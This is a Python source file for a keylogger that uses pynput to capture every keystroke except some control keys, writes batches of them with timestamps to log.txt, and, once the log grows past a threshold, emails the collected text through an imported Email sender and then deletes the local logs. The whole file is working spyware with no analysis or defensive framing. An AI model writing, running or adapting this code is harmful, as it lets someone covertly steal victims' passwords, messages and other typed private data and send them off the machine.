import datetime
from pynput.keyboard import Listener
from tools import len_file, delete_logs
from start import Email

buttons = ['Key.tab', 'Key.ctrl', 'Key.alt', 'Key.left', 'Key.right', 'Key.up', 'Key.down', 'Key.end', 'Key.page_down', 'Key.page_up',
           'Key.home', 'Key.end', 'Key.insert', 'Key.shift_r', 'Key.ctrt_l', 'Key.f1', 'Key.f2', 'Key.f3',
           'Key.f4', 'Key.f5', 'Key.f6', 'Key.f7', 'Key.f8', 'Key.f9', 'Key.f10', 'Key.f11', 'Key.f12', 'Key.esc']

encoding = 'UTF-8'


class Keylogger:
    def __init__(self):
        self.write_time()
        self.data = []

    def on_press(self, key):
        try:
            for i in buttons:
                if str(key) == i:
                    break

            else:
                self.write_file(key)
        except Exception as er:
            write_error(er)

    def write_file(self, key):
        d = len_file()
        if len(d) >= 30:
            try:
                Email().sender(d)
                print('send ')
                delete_logs()
                self.write_time()
            except Exception as er:
                write_error(er)

        else:
            try:
                k = str(key).replace("'", "")

                if k.find("backspace") > 0:
                    self.data.append('?')

                elif k.find("space") > 0:
                    self.data.append(' ')

                elif k.find("enter") > 0:
                    self.data.append('\n')

                elif k.find("Key") == -1:
                    self.data.append(key)

                else:
                    self.data.append(key)

                if len(self.data) >= 20:
                    with open('log.txt', 'a+', encoding=encoding) as file:
                        file.write(str(self.data))
                        file.flush()
                        self.data = []

            except Exception as er:
                write_error(er)

    def write_time(self):
        try:
            with open('log.txt', 'a+', encoding=encoding) as file:
                file.write('\n' + '\n' + str(datetime.datetime.now()) + '\n')
                file.flush()
        except Exception as er:
            write_error(er)


def write_error(er):
    with open('errors.txt', 'a+')as file:
        file.write('\n' + str(datetime.datetime.now()) + ':  ' + str(er))

if __name__ == "__main__":
    obj = Keylogger()
    with Listener(on_press=obj.on_press) as listener:
        listener.join()
